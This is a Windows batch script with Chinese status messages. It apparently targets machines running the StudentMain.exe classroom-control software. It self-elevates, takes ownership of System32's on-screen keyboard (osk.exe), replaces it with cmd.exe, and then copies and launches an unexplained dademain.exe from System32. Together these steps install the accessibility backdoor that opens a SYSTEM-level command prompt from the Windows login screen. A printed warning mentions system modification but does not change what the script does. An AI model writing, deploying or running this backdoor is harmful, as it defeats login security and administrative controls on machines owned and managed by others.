@echo off
setlocal EnableExtensions EnableDelayedExpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

chcp 65001 && cls

tasklist | find "StudentMain.exe" >nul 2>&1
if errorlevel 1 (
    set /p "choice=[-] 警告: 部署将修改系统文件与设置, 不建议在真实主机运行, 是否继续部署? (Y/N): "
    if /i "!choice!"=="N" (
        echo [-] 部署已取消!
        pause
        exit /b 1
    )
)

echo [+] 正在将屏幕键盘替换为 cmd 命令提示符 ...
takeown /F "C:\Windows\System32\osk.exe" >nul
if errorlevel 1 (
    echo [-] 部署失败!
    pause
    exit /b 1
)

icacls "C:\Windows\System32\osk.exe" /grant Administrators:F /C >nul
if errorlevel 1 (
    echo [-] 部署失败!
    pause
    exit /b 1
)

move "C:\Windows\System32\osk.exe" "%USERPROFILE%\Desktop\osk.exe" >nul
if errorlevel 1 (
    echo [-] 部署失败!
    pause
    exit /b 1
)

copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\osk.exe" >nul
if errorlevel 1 (
    echo [-] 部署失败!
    pause
    exit /b 1
)
echo [+] 替换成功, 屏幕键盘备份在 %USERPROFILE%\Desktop\osk.exe

echo [+] 正在复制 dademain.exe ...
copy "%~dp0dademain.exe" "C:\Windows\System32\dademain.exe" >nul
if errorlevel 1 (
    echo [-] 部署失败!
    pause
    exit /b 1
)

echo eula=true > "C:\Windows\System32\eula.txt"
if errorlevel 1 (
    echo [-] 部署失败!
    pause
    exit /b 1
)
echo [+] 复制成功!

echo [+] 正在启动 dademain.exe 以完成初始化 ...
start C:\Windows\System32\dademain.exe >nul 2>&1
if errorlevel 1 (
    echo [-] 部署失败!
    pause
    exit /b 1
)

echo [+] 初始化成功!
echo [+] 部署完成!
pause

endlocal